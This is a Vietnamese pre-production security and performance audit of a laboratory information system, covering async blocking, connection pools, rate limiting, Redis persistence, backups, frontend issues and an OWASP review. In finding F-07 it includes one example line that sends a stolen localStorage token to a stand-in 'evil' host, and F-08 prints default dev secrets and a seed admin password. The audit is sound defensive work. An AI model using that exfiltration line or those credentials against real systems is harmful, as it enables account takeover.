# Pre-Production Architecture Audit — LIMS Viện CNSH & Môi trường

**Ngày:** 2026-07-26 · **Tải mục tiêu:** ~60 người dùng đồng thời, ~100 req/phút, p95 < 2s
**Phạm vi:** FastAPI + SQLAlchemy(sync) + PostgreSQL 15 + Redis 7 + MinIO + React 18/Vite, chạy Docker Compose một host.

---

## 0. Phạm vi và giả định — đọc trước

### 0.1 Không có AI/LLM pipeline trong hệ thống này

Yêu cầu audit có mục "AI/LLM Pipeline" (prompt injection, RAG, vector DB, token cost, model fallback…).
**Tôi đã quét toàn bộ mã nguồn: hệ thống này KHÔNG có bất kỳ thành phần LLM, OCR, embedding hay vector database nào.**

- `requirements.txt` không có openai/anthropic/langchain/transformers/tesseract
- Không có endpoint nào gọi mô hình
- Thư mục cha tên `MTL_OCR` nhưng LIMS là dự án độc lập bên trong

Vì vậy **Mục 4 (AI/LLM) và các mục "Slow OCR", "Repeated LLM calls", "LLM API timeout" là N/A.**
Tôi không bịa ra phát hiện cho tầng không tồn tại. Nếu có pipeline OCR nằm ở repo khác, cần cung cấp để audit riêng.

### 0.2 Giả định phải nêu rõ (thiếu thông tin)

| # | Giả định | Vì sao cần | Nếu sai thì sao |
|---|---|---|---|
| A1 | Deploy bằng `docker-compose.prod.yml` trên **một** host | Không có manifest K8s, không có LB | Nếu chạy nhiều replica thì F-04, F-11 đổi mức độ |
| A2 | Host có ≥4 nhân, ≥8GB RAM | Chưa có thông số máy đích | Máy 1–2 nhân: F-01/F-02 từ Critical thành *chặn deploy* |
| A3 | Postgres/Redis/MinIO cùng host với app | Theo compose hiện tại | Nếu tách host thì latency mạng làm F-01 nặng hơn |
| A4 | Không có WAF/CDN trước nginx (trừ Cloudflare nếu dùng tunnel) | — | Có Cloudflare thì F-06 giảm nhẹ |
| A5 | Dữ liệu hiện tại nhỏ (bảng lớn nhất 6.924 dòng) | Đo từ `pg_stat_user_tables` | Khi lên 10⁵–10⁶ dòng, F-12/F-13 nhảy lên Critical |
| A6 | Chưa có giám sát ngoài (Prometheus scrape `/metrics`) | Có endpoint nhưng không thấy scraper | — |

### 0.3 Không kiểm được trong môi trường này

- Load test thật (không có k6/locust; không nên bắn tải vào máy dev của bạn)
- Hành vi trình duyệt thật (không có headless browser)
- Đo p95 dưới tải — các con số dưới đây là **suy luận từ kiến trúc**, có nêu cách tự đo

---

## 1. Executive Summary — 20 rủi ro hàng đầu

| # | Rủi ro | Mức | Tầng |
|---|---|---|---|
| F-01 | 16 endpoint upload `async def` gọi code chặn → **đóng băng toàn bộ API** | 🔴 Critical | Backend |
| F-02 | Uvicorn chạy **1 worker**, không tận dụng đa nhân | 🔴 Critical | DevOps |
| F-03 | Connection pool 30 < nhu cầu 60 user đồng thời → 500 hàng loạt | 🔴 Critical | Database |
| F-04 | Rate limit dùng IP proxy → **một người khoá cả viện** | 🔴 Critical | Security |
| F-05 | Redis không bật persistence → **token đã thu hồi sống lại** sau restart | 🔴 Critical | Security |
| F-06 | Không có backup/DR tự động | 🔴 Critical | DevOps |
| F-07 | Access token trong `localStorage` → XSS lấy được | 🟠 High | Security |
| F-08 | Secret dev hardcode trong `docker-compose.yml` (JWT, minioadmin) | 🟠 High | Security |
| F-09 | Bundle **1,18 MB một chunk**, không code-split, không lazy | 🟠 High | Frontend |
| F-10 | Không debounce ô tìm kiếm → mỗi ký tự = 1 request | 🟠 High | Frontend |
| F-11 | `limit:100` + phân trang client → **âm thầm mất dữ liệu** từ dòng 101 | 🟠 High | Frontend/API |
| F-12 | N+1 query trong mọi serializer danh sách | 🟠 High | Database |
| F-13 | 20+ khoá ngoại **không có index** | 🟠 High | Database |
| F-14 | `lims-api`/`lims-web` **không có healthcheck** | 🟠 High | DevOps |
| F-15 | Không có Error Boundary → **màn hình trắng** khi 1 component lỗi | 🟠 High | Frontend |
| F-16 | `useAsync` không huỷ request → race condition, dữ liệu cũ đè mới | 🟠 High | Frontend |
| F-17 | Middleware Idempotency **chưa bao giờ được dùng** (FE không gửi header) | 🟡 Medium | Backend |
| F-18 | `boto3.client()` tạo mới mỗi lần gọi | 🟡 Medium | Performance |
| F-19 | Không có CI frontend; `npm run lint` từng vô hiệu | 🟡 Medium | DevOps |
| F-20 | SPOF toàn diện: 1 host, 0 replica, không rollback | 🟠 High | Architecture |

---

## 2. Detailed Findings

### 🔴 F-01 — Endpoint upload `async def` chặn toàn bộ event loop

| | |
|---|---|
| **Severity** | **Critical** |
| **Tầng** | Backend / Performance |

**Bằng chứng**

```python
# app/routers/attachments.py:25
async def upload_attachment(...):          # ← async: chạy TRỰC TIẾP trên event loop
    content = await file.read()
    data = attachment_service.create_attachment(...)   # ← sync def, KHÔNG await

# app/services/storage_service.py:78 — boto3 đồng bộ, chặn thread
def put_object(file_key, data, content_type=None):
    client = _client()
    client.put_object(Bucket=..., Key=file_key, Body=data)
```

16 endpoint dính lỗi này: `attachments`, `documents` (×3), `forms` (×2), `equipments` (×2),
`chemicals`, `chemical_lots`, `results`, `samples`, `test_requests`, `research`, `hr_profiles`, `auth/me/avatar`.

**Vì sao xảy ra**
FastAPI chỉ đẩy handler `def` (đồng bộ) sang threadpool. Handler `async def` chạy thẳng
trên event loop. Bên trong lại gọi `create_attachment()` — hàm đồng bộ làm INSERT Postgres
+ PUT MinIO. Trong lúc đó event loop **không xử lý được request nào khác**.

**Kịch bản production**
9h sáng, một KTV tải file CoA 18 MB. MinIO ghi mất ~1,5s. Trong 1,5s đó **toàn bộ 60 người
dùng bị treo** — dashboard không tải, đăng nhập không phản hồi, mọi request xếp hàng.
Ba người cùng tải file → API đứng ~4,5s.

**Tác động** p95 vọt từ <2s lên >5s bất cứ khi nào có upload. Với A2 (1 worker), đây là
**điểm chết toàn hệ thống**, không phải chậm cục bộ.

**Cách tái hiện**
```bash
# Terminal 1 — bắn upload 20MB
dd if=/dev/urandom of=/tmp/big.bin bs=1M count=18
time curl -X POST http://localhost:8060/api/v1/attachments \
  -H "Authorization: Bearer $T" -F owner_type=sample -F owner_id=$ID -F file=@/tmp/big.bin

# Terminal 2 — CÙNG LÚC đo một GET nhẹ
while true; do curl -s -o /dev/null -w "%{time_total}\n" \
  http://localhost:8060/api/v1/health; sleep 0.2; done
# → thời gian /health nhảy từ ~0.01s lên bằng thời lượng upload
```

**Khắc phục**
```python
# Cách 1 (ít sửa nhất): đổi async def → def. FastAPI tự đẩy sang threadpool.
def upload_attachment(...):
    content = file.file.read()          # UploadFile.file là SpooledTemporaryFile
    ...

# Cách 2 (giữ async): đẩy phần chặn sang threadpool
from starlette.concurrency import run_in_threadpool
async def upload_attachment(...):
    content = await file.read()
    data = await run_in_threadpool(attachment_service.create_attachment, ...)
```
Cách 1 đúng hơn cho codebase đồng bộ này. **Ưu tiên P0.**

---

### 🔴 F-02 — Uvicorn 1 worker

| | |
|---|---|
| **Severity** | **Critical** |

**Bằng chứng** `Dockerfile:30` — `CMD ["uvicorn","app.main:app","--host","0.0.0.0","--port","8060"]`
Không có `--workers`. `docker-compose.prod.yml` cấp `cpus: 2.0` nhưng app chỉ dùng được 1 nhân.

**Kịch bản** Xuất báo cáo Excel (`openpyxl`, `form_service.py:392`) là tác vụ CPU thuần.
Một người bấm "Xuất Excel" 5.000 dòng → 1 nhân bận ~3–8s. Handler đó là `def` nên chạy
threadpool, nhưng GIL khiến các thread Python khác cũng chậm theo.

**Khắc phục**
```dockerfile
CMD ["uvicorn","app.main:app","--host","0.0.0.0","--port","8060", \
     "--workers","4","--proxy-headers","--forwarded-allow-ips","*"]
```
⚠ **Chú ý:** nhiều worker → APScheduler phải dựa vào leader-lock Redis (đã có ở
`scheduler.py:168` ✔) và `db_pool_size` là **per-worker** → xem F-03.

---

### 🔴 F-03 — Connection pool cạn ở 60 người dùng

| | |
|---|---|
| **Severity** | **Critical** |

**Bằng chứng**
```python
db_pool_size = 10; db_max_overflow = 20; db_pool_timeout = 10   # app/config.py:36-38
```
→ tối đa **30 kết nối**. Threadpool AnyIO mặc định **40 thread**.

**Vì sao xảy ra**
Mỗi request giữ 1 connection suốt vòng đời (`get_db` là dependency). `get_current_user`
(`deps.py:67`) còn `db.get(User, ...)` **mỗi request**. 40 thread tranh 30 connection →
10 thread chờ, quá `pool_timeout=10s` → `TimeoutError` → HTTP 500.

**Kịch bản** 8h30 đầu giờ, 60 người mở dashboard. Dashboard gọi ~6 endpoint song song
(KPI, chart, thông báo, badge…) → ~360 request trong vài giây. Pool 30 cạn ngay.
Người dùng thấy lỗi 500 ngẫu nhiên, F5 lại thì được — kiểu lỗi khó chẩn đoán nhất.

**Nhân với F-02:** 4 worker × 30 = 120 connection, trong khi Postgres mặc định
`max_connections=100` → **Postgres từ chối kết nối**, còn tệ hơn.

**Cách tái hiện**
```bash
# Cần cài: apt install apache2-utils
ab -n 600 -c 60 -H "Authorization: Bearer $T" \
   http://localhost:8060/api/v1/users?limit=20
# Xem tỉ lệ non-2xx và log "QueuePool limit of size 10 overflow 20 reached"
docker exec lims-postgres psql -U lims -d lims -c \
  "SELECT count(*), state FROM pg_stat_activity WHERE datname='lims' GROUP BY state;"
```

**Khắc phục**
```bash
# .env — với 4 worker: 4 × (8+12) = 80 < max_connections 100, chừa chỗ cho migrate/psql
DB_POOL_SIZE=8
DB_MAX_OVERFLOW=12
DB_POOL_TIMEOUT=5          # fail nhanh còn hơn treo 10s
```
```yaml
# docker-compose.prod.yml — nới Postgres
postgres:
  command: ["postgres","-c","max_connections=200","-c","shared_buffers=512MB"]
```
Dài hạn: đặt **PgBouncer** (transaction pooling) giữa app và Postgres.

---

### 🔴 F-04 — Rate limit khoá nhầm toàn bộ người dùng

| | |
|---|---|
| **Severity** | **Critical** |

**Bằng chứng**
```python
# app/core/rate_limit.py:29
ip = request.client.host if request.client else "unknown"
key = f"ratelimit:{key_prefix}:{ip}"
```
Uvicorn chạy **không có `--proxy-headers`** → `request.client.host` luôn là IP container
nginx (`172.x.x.x`), không phải người dùng. Xác nhận thực tế: log audit ghi `172.21.0.6`.

**Vì sao nguy hiểm hơn tưởng**
`/auth/login` giới hạn **20 request/60 giây**. Vì mọi người chung một "IP", tổng số lần
đăng nhập của **cả viện** là 20/phút. 60 người vào lúc 8h → người thứ 21 nhận **429**.

Với các endpoint m30 vừa thêm còn tệ hơn: `/auth/register` 5 lần/10 phút, `/auth/forgot-password`
5 lần/10 phút — **dùng chung cho toàn hệ thống**.

Đồng thời: lockout đăng nhập (`login_lock_key(email, ip)`) cũng bị gộp; và audit log ghi sai IP
→ **mất giá trị truy vết theo ISO/IEC 17025 §7.5**.

**Cách tái hiện**
```bash
for i in $(seq 1 25); do
  curl -s -o /dev/null -w "%{http_code} " -X POST http://localhost:3060/api/v1/auth/login \
    -H 'Content-Type: application/json' -d '{"email":"a@b.c","password":"x"}'
done; echo
# → 401 ×20 rồi 429 ×5, dù đến từ 25 "người" khác nhau
```

**Khắc phục** (3 phần, phải làm đủ)

1. `Dockerfile` — bật proxy headers (xem F-02)
2. `nginx.conf` — chuyển tiếp IP thật:
```nginx
location /api/ {
    set $real_client $remote_addr;
    if ($http_cf_connecting_ip) { set $real_client $http_cf_connecting_ip; }
    proxy_set_header X-Forwarded-For $real_client;
    proxy_set_header X-Real-IP       $real_client;
    proxy_set_header X-Forwarded-Proto https;
    # ... giữ nguyên phần còn lại
}
```
3. Với endpoint đăng nhập, **key theo email + IP** (đã làm cho lockout, chưa làm cho rate_limit):
```python
def _dep(request: Request) -> None:
    ip = request.headers.get("x-real-ip") or (request.client.host if request.client else "unknown")
```

---

### 🔴 F-05 — Redis mất dữ liệu khi restart → token đã thu hồi sống lại

| | |
|---|---|
| **Severity** | **Critical** (Broken Authentication — OWASP A07) |

**Bằng chứng**
```yaml
# docker-compose.prod.yml:34
command: ["redis-server", "--requirepass", "${REDIS_PASSWORD}"]
```
Không có `--appendonly yes`, không có `--save`. Volume `lims_redisdata` được mount nhưng
Redis **không ghi gì vào đó** với cấu hình này.

Redis đang giữ 5 loại dữ liệu, **tất cả biến mất khi restart**:

| Dữ liệu | Hậu quả khi mất |
|---|---|
| **jti denylist** (`security.deny_jti`) | 🔴 Access token của người đã **đăng xuất** hoạt động lại tới 30 phút |
| Lockout đăng nhập | Reset bộ đếm brute-force |
| Rate limit | Reset toàn bộ hạn mức |
| Leader-lock scheduler | Nhiều replica cùng chạy cron |
| Cache RBAC | Chỉ chậm, không sai |

**Kịch bản** Một tài khoản admin bị nghi lộ. Quản trị viên bấm "Đăng xuất mọi thiết bị"
→ jti vào denylist. 10 phút sau container Redis restart (OOM/deploy) → **token của kẻ tấn
công dùng lại được**. Không có dấu vết nào trong log cho biết chuyện này đã xảy ra.

**Cách tái hiện**
```bash
T=$(curl -s -X POST .../auth/login -d '{...}' | jq -r .data.access_token)
curl -s -X POST .../auth/logout -H "Authorization: Bearer $T"     # → 204
curl -s .../auth/me -H "Authorization: Bearer $T"                 # → 401 ✔
docker restart lims-redis && sleep 5
curl -s .../auth/me -H "Authorization: Bearer $T"                 # → 200 ✖ TOKEN SỐNG LẠI
```

**Khắc phục**
```yaml
redis:
  command: ["redis-server","--requirepass","${REDIS_PASSWORD}",
            "--appendonly","yes","--appendfsync","everysec",
            "--maxmemory","384mb","--maxmemory-policy","noeviction"]
```
`noeviction` quan trọng: với `allkeys-lru`, Redis đầy sẽ **xoá jti denylist** để lấy chỗ.
Bổ sung: hạ `access_token_ttl_minutes` từ 30 → 10 để thu hẹp cửa sổ rủi ro.

---

### 🔴 F-06 — Không có backup/DR

| | |
|---|---|
| **Severity** | **Critical** |

**Bằng chứng** Không có `pg_dump` trong cron, compose hay CI. Không có tài liệu RTO/RPO.
Volume `lims_pgdata`, `lims_miniodata` nằm **cùng host** với app.

**Kịch bản** Ổ SSD hỏng, hoặc `docker compose down -v` gõ nhầm → **mất toàn bộ** hồ sơ thử
nghiệm, tài liệu ISO, dữ liệu hiệu chuẩn thiết bị. Đây là dữ liệu bắt buộc lưu trữ theo
ISO/IEC 17025 §7.5 (hồ sơ kỹ thuật) và §8.4 (kiểm soát hồ sơ).

**Khắc phục** — làm trước khi go-live, không phải sau
```bash
sudo tee /etc/cron.daily/lims-backup >/dev/null <<'EOF'
#!/bin/bash
set -euo pipefail
D=/var/backups/lims && mkdir -p $D
docker exec lims-postgres pg_dump -U lims -Fc lims > $D/db-$(date +%F).dump
docker run --rm -v lims_miniodata:/data -v $D:/backup alpine \
  tar czf /backup/files-$(date +%F).tar.gz -C /data .
find $D -mtime +14 -delete
rsync -a $D/ backup-server:/lims/    # BẮT BUỘC: đưa ra khỏi host
EOF
sudo chmod +x /etc/cron.daily/lims-backup
```
Và **diễn tập phục hồi ít nhất 1 lần** — backup chưa restore thử thì chưa phải backup.

---

### 🟠 F-07 — Access token trong `localStorage`

| | |
|---|---|
| **Severity** | High (OWASP A07) |

**Bằng chứng** `lib/api.ts:17-21` — `localStorage.getItem/setItem(TOKEN_KEY)`

**Vì sao** Refresh token đã làm đúng (HttpOnly + Secure + SameSite=Strict, `_cookies.py`).
Nhưng access token lại nằm ở `localStorage` — mọi đoạn JS trên trang đọc được.

**Kịch bản** Một lỗ XSS bất kỳ (thư viện npm bị chèn mã, một chỗ `dangerouslySetInnerHTML`,
một file SVG được phục vụ inline) → kẻ tấn công `fetch('//evil/'+localStorage.lims_access)`
và có quyền admin trong 30 phút.

> Điểm cộng: tôi đã kiểm — codebase **không dùng `dangerouslySetInnerHTML`** ở đâu cả,
> và `avatar_service` chặn SVG bằng magic bytes. Bề mặt XSS hiện hẹp, nhưng lưu token ở
> `localStorage` biến mọi XSS tương lai thành chiếm quyền toàn hệ thống.

**Khắc phục** Giữ access token **trong biến JS (in-memory)**, mất khi F5, lấy lại bằng
`/auth/refresh` (cookie HttpOnly vẫn còn). Đây là mô hình chuẩn hiện nay.

---

### 🟠 F-08 — Secret dev hardcode trong compose

**Bằng chứng** `docker-compose.yml:76,79` và khối `environment:`
```yaml
JWT_SECRET: dev_only_change_me_super_secret_key_min_32_chars
MINIO_ACCESS_KEY: minioadmin
MINIO_SECRET_KEY: minioadmin
SEED_ADMIN_PASSWORD: ChangeMe@123
```
File này **được commit lên GitHub public**.

Giảm nhẹ: `config.py` có `_guard_production_secrets` từ chối khởi động ở
`ENVIRONMENT=production` nếu còn giá trị mặc định — thiết kế tốt ✔.
Nhưng nếu ai đó chạy `docker-compose.yml` (dev) trên máy có IP public thì mọi thứ mở toang.

**Khắc phục** Chuyển toàn bộ sang `${VAR:?}` và để trong `.env` (đã gitignore). Bổ sung
`gitleaks` hoặc `trufflehog` vào CI.

---

### 🟠 F-09 — Bundle 1,18 MB một chunk

**Bằng chứng**
```
dist/assets/index-D9yw72CB.js   1.185.245 bytes (~296 KB gzip)
```
Không có `React.lazy`, không có `Suspense`, không có `manualChunks`. 53 trang + recharts +
lucide gộp làm một.

**Kịch bản** Người dùng mở app trên 4G ở phòng lab (≈1,5 MB/s) → **~1,2s chỉ để tải JS**,
chưa kể parse ~300ms trên máy văn phòng cũ. Mỗi lần deploy, hash đổi → 100% người dùng
tải lại toàn bộ, kể cả khi chỉ sửa một trang.

**Khắc phục**
```ts
// vite.config.ts
build: {
  rollupOptions: {
    output: {
      manualChunks: {
        react: ['react', 'react-dom', 'react-router-dom'],
        charts: ['recharts'],        // ~400KB, chỉ dashboard cần
        icons: ['lucide-react'],
      },
    },
  },
}
```
```tsx
// App.tsx — lazy 53 trang
const Reports = lazy(() => import('@/pages/Reports'));
<Suspense fallback={<LoadingState />}><Routes>…</Routes></Suspense>
```
Ước tính: chunk đầu vào còn ~150–200 KB gzip.

---

### 🟠 F-10 — Không debounce ô tìm kiếm

**Bằng chứng** `SearchInput.tsx` gọi `onChange` mỗi keystroke; trang dùng
`useAsync(() => api.list({q}), [q])` → **mỗi ký tự = 1 request**.

**Kịch bản** Gõ "chloroform" (10 ký tự) = **10 request**. 20 người cùng tìm giờ cao điểm
= 200 request trong vài giây, cộng dồn vào pool đã cạn (F-03). Response về **không đúng thứ tự**
→ kết quả của "chlo" đè lên kết quả của "chloroform" (xem F-16).

**Khắc phục**
```ts
// lib/useDebounced.ts
export function useDebounced<T>(value: T, ms = 350): T {
  const [v, setV] = useState(value);
  useEffect(() => { const t = setTimeout(() => setV(value), ms); return () => clearTimeout(t); }, [value, ms]);
  return v;
}
// dùng: const dq = useDebounced(q); useAsync(() => api.list({q: dq}), [dq]);
```

---

### 🟠 F-11 — `limit:100` + phân trang client → âm thầm mất dữ liệu

**Bằng chứng** 50 chỗ gọi `limit: 100`, rồi `<DataTable pageSize={12}>` phân trang **ở client**.

**Vì sao nguy hiểm** Người dùng thấy "Hiển thị 1–12 / 100 bản ghi" và tin rằng có đúng 100.
Thực tế bảng `test_parameters` đã có **614 dòng** → **514 dòng vô hình**, không có cảnh báo nào.

**Kịch bản** KTV tìm chỉ tiêu "Coliforms", nó nằm ở dòng 340 theo thứ tự server trả →
**không tìm thấy**, kết luận sai là hệ thống chưa có chỉ tiêu đó, tạo trùng.

**Tác động** Sai lệch dữ liệu nghiệp vụ — nghiêm trọng hơn cả vấn đề hiệu năng.

**Khắc phục** Chuyển `DataTable` sang phân trang **server-side**: truyền `page`/`limit`
xuống API, dùng `total` từ response `paginated()` (backend đã trả sẵn ✔).

---

### 🟠 F-12 — N+1 query trong serializer danh sách

**Bằng chứng**
```python
# user_service.py:93,98
result = [_serialize_user_list(db, u) for u in rows]
def _serialize_user_list(db, user):
    dept = db.get(Department, user.department_id) if user.department_id else None
```
Cùng mẫu ở `activity_service.py:58,152,237`, `audit_read_service.py:78`,
`activity_report_service.py:208`, `nc_common.py:169`.

**Tác động** `GET /users?limit=100` → **1 + 100 = 101 query**. Ở dữ liệu hiện tại (nhỏ) chỉ
tốn ~30ms, nhưng nhân với 60 user × pool cạn (F-03) thì thành nút cổ chai thật.

**Khắc phục**
```python
rows = db.execute(
    select(User).options(joinedload(User.department))   # cần khai relationship
    .where(*conditions).order_by(...).offset(...).limit(limit)
).unique().scalars().all()
```
Hoặc nạp trước một lượt: `{d.id: d for d in db.scalars(select(Department))}`.

---

### 🟠 F-13 — 20+ khoá ngoại không có index

**Bằng chứng** (truy vấn `pg_constraint` trên DB thật)
```
users.created_by, users.updated_by, departments.created_by/updated_by,
customers.*, test_requests.*, samples.*, sample_assignments.*,
sample_results.entered_by/approved_by, chemicals.*, chemical_lots.*,
chemical_recheck_records.checked_by, hr_profiles.*  … (20+ cột)
```

**Vì sao** Postgres **không tự tạo index cho khoá ngoại** (khác MySQL/InnoDB).

**Kịch bản** Vô hiệu hoá một user → `ON DELETE RESTRICT` phải **seq scan** mọi bảng tham
chiếu để kiểm tra. Hiện tại nhanh vì bảng nhỏ; khi `samples` lên 200k dòng thì mỗi thao
tác quản trị user khoá bảng vài giây.

**Khắc phục**
```sql
-- migration m31, dùng CONCURRENTLY để không khoá bảng
CREATE INDEX CONCURRENTLY IF NOT EXISTS ix_samples_created_by ON samples(created_by);
-- … lặp cho từng cột trong danh sách trên
```
⚠ `CREATE INDEX CONCURRENTLY` **không chạy được trong transaction** → migration phải đặt
`with op.get_context().autocommit_block():`.

---

### 🟠 F-14 — Không có healthcheck cho api/web

**Bằng chứng** `docker-compose.prod.yml` có `healthcheck` cho postgres/redis/minio (3 cái)
nhưng **không có** cho `lims-api` và `lims-web`.

**Kịch bản** API rơi vào trạng thái treo (pool cạn, không crash) → Docker thấy container
"Up", nginx vẫn chuyển tiếp, người dùng nhận 502/timeout. **Không ai được cảnh báo.**

Đã xảy ra thật trong phiên này: container `lims-api` `Exited (255)` vì migration lỗi,
chỉ phát hiện khi người dùng báo màn hình lỗi.

**Khắc phục**
```yaml
lims-api:
  healthcheck:
    test: ["CMD","curl","-fsS","http://localhost:8060/api/v1/health/ready"]
    interval: 15s
    timeout: 5s
    retries: 3
    start_period: 60s      # chờ migration xong
  restart: unless-stopped
```
Lưu ý: `/health/ready` có chạm DB+Redis+MinIO — đúng cho readiness. Cần thêm
`/health` (liveness, không phụ thuộc) để tránh restart loop khi chỉ MinIO chết.

---

### 🟠 F-15 — Không có Error Boundary

**Bằng chứng** Không tìm thấy `componentDidCatch` / `ErrorBoundary` / `getDerivedStateFromError`.

**Kịch bản** API trả `null` cho một trường mà component không kiểm (`user.department.name`)
→ React unmount **toàn bộ cây** → **màn hình trắng hoàn toàn**. Người dùng không có nút nào
để bấm, không thấy thông báo, phải tự đoán là F5.

**Khắc phục** Bọc `<Routes>` bằng ErrorBoundary hiển thị màn hình lỗi + nút "Tải lại" +
mã correlation-id để tra log.

---

### 🟠 F-16 — `useAsync` race condition

**Bằng chứng**
```ts
const reload = useCallback(() => { run(); }, [run]);   // ← BỎ QUA hàm cleanup mà run() trả về
```
`run()` trả về cleanup đặt `active=false`. `useEffect` dùng đúng, nhưng `reload()`
**vứt bỏ** nó → request cũ vẫn "active" và có thể `setData` sau request mới.
Ngoài ra **không có `AbortController`** → request không bị huỷ, chỉ bị phớt lờ.

**Kịch bản** Người dùng bấm "Làm mới" 2 lần. Lần 1 chậm (300ms), lần 2 nhanh (80ms).
Lần 2 render trước, lần 1 về sau **đè lên** → hiển thị **dữ liệu cũ hơn**. Trong LIMS,
đây là hiển thị sai trạng thái mẫu/kết quả thử nghiệm.

**Khắc phục**
```ts
export function useAsync<T>(fn: (signal: AbortSignal) => Promise<T>, deps: unknown[]) {
  const seqRef = useRef(0);
  const run = useCallback(() => {
    const seq = ++seqRef.current;
    const ac = new AbortController();
    setLoading(true);
    fn(ac.signal)
      .then((d) => { if (seq === seqRef.current) setData(d); })
      .catch((e) => { if (seq === seqRef.current && e.name !== 'AbortError') setError(e); })
      .finally(() => { if (seq === seqRef.current) setLoading(false); });
    return () => ac.abort();
  }, deps);
  useEffect(() => run(), [run]);
  return { data, loading, error, reload: run };
}
```
`lib/api.ts:130` đã hỗ trợ `signal` ✔ — chỉ cần nối vào.

---

### 🟡 F-17 → F-20 (tóm tắt)

| ID | Vấn đề | Bằng chứng | Khắc phục |
|---|---|---|---|
| **F-17** | Middleware Idempotency chưa từng kích hoạt | FE không gửi `Idempotency-Key` ở đâu cả | Sinh UUID cho mọi POST tạo mới trong `lib/api.ts` |
| **F-18** | `boto3.client()` tạo mới mỗi lần | `storage_service.py:43,59,79,106` | Cache client bằng `@lru_cache` — tiết kiệm ~50ms/lần |
| **F-19** | Không có CI frontend | `.github/workflows/` chỉ có `backend-ci.yml` | Thêm job `npm run check && npm run build` |
| **F-20** | SPOF toàn diện | 1 host, 0 replica, không blue-green/rollback | Xem §6 |

---

## 3. OWASP Top 10 — kết quả rà soát

| # | Hạng mục | Kết quả | Ghi chú |
|---|---|---|---|
| A01 | Broken Access Control | 🟡 Phần lớn tốt | RBAC tập trung `require_roles`; **chưa kiểm hết IDOR** — xem §3.1 |
| A02 | Cryptographic Failures | 🟢 Tốt | bcrypt cost 12, refresh token sha256, không lưu token thô |
| A03 | Injection (SQL) | 🟢 Tốt | SQLAlchemy Core/ORM toàn bộ, **0 chỗ nối chuỗi SQL** |
| A03 | Injection (Command) | 🟢 Không có | Không có `subprocess`/`os.system` trong đường request |
| A03 | Prompt Injection | ⚪ N/A | Không có LLM |
| A04 | Insecure Design | 🟠 F-04, F-11 | Rate limit sai chủ thể; phân trang gây sai dữ liệu |
| A05 | Security Misconfiguration | 🔴 F-05, F-08 | Redis không bền vững; secret trong repo |
| A06 | Vulnerable Components | 🟡 Chưa kiểm | **Không có `pip-audit`/`npm audit` trong CI** |
| A07 | Auth Failures | 🔴 F-05, F-07 | Token thu hồi sống lại; token ở localStorage |
| A08 | Data Integrity | 🟢 Tốt | `audit_logs` có trigger bất biến — xác nhận thực tế: `DELETE` bị chặn |
| A09 | Logging Failures | 🟠 F-04 | Log ghi **sai IP** → mất giá trị truy vết |
| A10 | SSRF | 🟢 Không có | Không có endpoint nào fetch URL do người dùng cung cấp |

### 3.1 IDOR — chưa kiểm đủ, cần test riêng

Tôi kiểm mẫu và thấy **có** kiểm quyền đúng ở các chỗ đã xem
(`session_service.revoke_session` lọc theo `user_id`, `attachment_service._check_owner_read_permission`).
Nhưng với **294 endpoint** và thời lượng audit này, **không thể khẳng định toàn bộ đều an toàn**.

**Cần làm:** viết test tự động quét IDOR — với mỗi endpoint `/{id}`, đăng nhập bằng user A
rồi truy cập tài nguyên của user B, kỳ vọng 403/404.

### 3.2 Điểm cộng đáng ghi nhận

| Hạng mục | Đánh giá |
|---|---|
| Chống dò tài khoản | `_DUMMY_PASSWORD_HASH` cân bằng thời gian phản hồi — hiếm thấy ở dự án nội bộ |
| Refresh rotation + reuse detection | Đúng chuẩn OAuth BCP |
| Cookie refresh | HttpOnly + Secure + SameSite=Strict + path hẹp |
| Upload validation | Magic bytes cho avatar; allowlist MIME cho attachment; sanitize tên file chống header-injection |
| Security headers | HSTS/CSP/nosniff/frame-ancestors đầy đủ, HSTS chỉ bật ở production |
| Migration | Advisory lock chống race khi nhiều replica |
| Audit log | Trigger bất biến (append-only) — đúng ISO/IEC 17025 |

---

## 4. Mô phỏng tình huống production

| Tình huống | Hệ thống hành xử thế nào (dựa trên code) |
|---|---|
| **60 người đăng nhập cùng lúc** | 🔴 Người thứ 21 nhận **429** (F-04). Số còn lại: pool cạn (F-03) → 500 ngẫu nhiên. bcrypt cost 12 ≈ 250ms/lần × 60 trên 1 nhân ≈ **15s** để xử lý hết (F-02) |
| **60 người tải PDF cùng lúc** | 🔴 Mỗi upload chặn event loop (F-01) → xếp hàng tuần tự. 60 × 1,5s = **90 giây API đứng hình**. Middleware `RequestLimitsMiddleware` chặn >20MB ✔ nhưng không giới hạn *số* upload đồng thời |
| **OCR queue đầy** | ⚪ N/A — không có OCR |
| **LLM timeout** | ⚪ N/A — không có LLM |
| **Postgres tạm mất** | 🟡 `pool_pre_ping=True` phát hiện connection chết ✔. `/health/ready` trả lỗi ✔. Nhưng **không có healthcheck** nên không ai được báo (F-14). Request trả 500, không có degraded mode |
| **Redis chết** | 🟡 Rate limit **tự bỏ qua** (`except → return`) — chọn đúng, không chặn nghiệp vụ. Lockout ngừng hoạt động → **mở đường brute-force**. Scheduler leader-lock lỗi → replica tự khởi động (có per-job lock bảo vệ ✔). Khi Redis lên lại: **jti denylist rỗng** (F-05) |
| **MinIO chết** | 🟡 Upload lỗi 500. `avatar_url()` bắt exception → trả `None`, avatar rơi về chữ cái đầu ✔ (thiết kế tốt). Presigned URL đã phát vẫn dùng được. `/health/ready` đỏ ✔ |
| **Worker chết giữa chừng** | ⚪ Không có worker/queue. Mọi việc chạy đồng bộ trong request → **request chết = việc chết**, không retry, không dead-letter |
| **Người dùng F5 giữa lúc upload** | 🟠 Request bị huỷ ở client, nhưng server **vẫn chạy tiếp** đến hết. File có thể đã vào MinIO + DB mà người dùng tưởng thất bại → **thử lại → trùng bản ghi** (F-17 lẽ ra chặn được nhưng chưa dùng) |
| **Upload trùng** | 🟠 Tạo 2 attachment giống hệt. Không có dedupe theo checksum |
| **Mất mạng giữa chừng** | 🟠 Không có retry/queue offline. Người dùng mất dữ liệu form đang nhập (trừ `MonthlyReport` có autosave nháp ✔) |
| **Server restart** | 🟡 `restart: unless-stopped` chưa đặt cho lims-api. Migration chạy có advisory lock ✔. Người dùng bị đăng xuất khỏi access token? Không — JWT stateless nên vẫn dùng được ✔ |
| **Token hết hạn giữa lúc xử lý** | 🟢 `lib/api.ts` tự refresh khi 401 rồi retry 1 lần ✔. Nhưng **request multipart sẽ retry với body đã tiêu thụ** → cần kiểm |
| **Queue 1000 job** | ⚪ N/A |
| **Đĩa gần đầy** | 🔴 Không có cảnh báo. Postgres dừng ghi khi hết chỗ → **mọi thao tác lỗi**. MinIO cũng vậy. Không có log rotation cho Docker → log JSON phình vô hạn |
